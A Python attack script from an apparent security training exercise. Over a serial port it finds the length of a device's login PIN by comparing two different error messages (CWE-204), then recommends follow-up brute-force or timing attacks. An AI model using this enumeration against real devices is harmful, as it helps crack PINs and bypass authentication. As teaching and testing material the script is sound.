#!/usr/bin/env python3
"""
error_oracle.py — Decouvre la longueur du PIN via l'oracle d'erreur (VH8)
GUARDIA B1 — Script War Day, objectif A12

Principe :
    auth_cmd_login() retourne "[AUTH] Saisie invalide" si le PIN saisi
    n'a pas la meme longueur que PIN_SECRET, et "[AUTH] PIN incorrect"
    si la longueur est correcte mais la valeur fausse.

    En testant des PINs de longueur 1, 2, 3, ..., 8, on detecte
    la longueur exacte du PIN en 8 essais maximum.

    CWE-204 (Observable Response Discrepancy)
    Ref : OWASP A01:2021 — username/password enumeration

Usage :
    python error_oracle.py COM3
"""

import serial
import time
import sys
import argparse


def ouvrir_port(port, baud=115200, timeout=2.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def envoyer_commande(ser, commande, attente=1.0):
    ser.reset_input_buffer()
    for c in commande:
        ser.write(c.encode())
        time.sleep(0.02)
    ser.write(b"\r\n")
    time.sleep(attente)
    reponse = ser.read(ser.in_waiting or 1024).decode(errors="replace")
    return reponse


def main():
    parser = argparse.ArgumentParser(
        description="Error Oracle — decouvre la longueur du PIN (VH8)"
    )
    parser.add_argument("port", help="Port serie de la cible (ex: COM3)")
    parser.add_argument("--max-len", type=int, default=8,
                        help="Longueur max a tester (defaut: 8)")
    args = parser.parse_args()

    print("=" * 55)
    print("  ERROR ORACLE — BlackBox B1 GUARDIA")
    print("=" * 55)
    print(f"  Port   : {args.port}")
    print(f"  Cible  : VH8 — oracle longueur PIN")
    print(f"  Methode: CWE-204 (Observable Response Discrepancy)")
    print("=" * 55)
    print()

    ser = ouvrir_port(args.port)

    # D'abord, envoyer un retour chariot pour etre sur d'avoir un prompt
    envoyer_commande(ser, "", attente=0.5)

    pin_len = None
    msg_invalide = None
    msg_incorrect = None

    print(f"[*] Test de longueurs 1 a {args.max_len}...")
    print()
    print(f"  {'Len':>3}  {'PIN teste':>10}  {'Reponse':>30}  {'Resultat'}")
    print(f"  {'---':>3}  {'----------':>10}  {'------------------------------':>30}  {'--------'}")

    for length in range(1, args.max_len + 1):
        # Generer un PIN de la longueur voulue (tous des '1')
        test_pin = "1" * length
        reponse = envoyer_commande(ser, f"login {test_pin}", attente=1.5)

        # Analyser la reponse
        if "Saisie invalide" in reponse:
            status = "INVALIDE (mauvaise longueur)"
            msg_invalide = reponse.strip()
        elif "PIN incorrect" in reponse:
            status = "INCORRECT => LONGUEUR TROUVEE !"
            msg_incorrect = reponse.strip()
            pin_len = length
        elif "reussie" in reponse.lower():
            status = "CONNEXION REUSSIE !!"
            pin_len = length
        elif "Trop de tentatives" in reponse or "Bloque" in reponse:
            status = "BLOQUE (anti-brute force)"
        else:
            status = f"? ({reponse.strip()[:40]})"

        print(f"  {length:>3}  {test_pin:>10}  {status}")

        if pin_len:
            break

    print()
    print("-" * 55)

    if pin_len:
        print(f"[+] VH8 PRESENTE — Longueur du PIN decouverte : {pin_len} chiffres")
        print()
        print("    Les deux messages d'erreur sont differents :")
        if msg_invalide:
            print(f"      Mauvaise longueur : 'Saisie invalide'")
        if msg_incorrect:
            print(f"      Bonne longueur    : 'PIN incorrect'")
        print()
        print(f"    Espace de recherche : 10^{pin_len} = {10**pin_len} combinaisons")
        print(f"    (au lieu de 10^1 + 10^2 + ... + 10^8 = ~111 millions)")
        print()
        print("    Action suivante : lancer brute_force.py ou timing_attack.py")
        print(f"                     avec un PIN de {pin_len} chiffres.")
    else:
        print("[v] VH8 CORRIGEE — Messages d'erreur uniformes.")
        print("    Impossible de determiner la longueur du PIN.")
        print("    Objectif A12 : 0 pt.")

    print()
    ser.close()


if __name__ == "__main__":
    main()
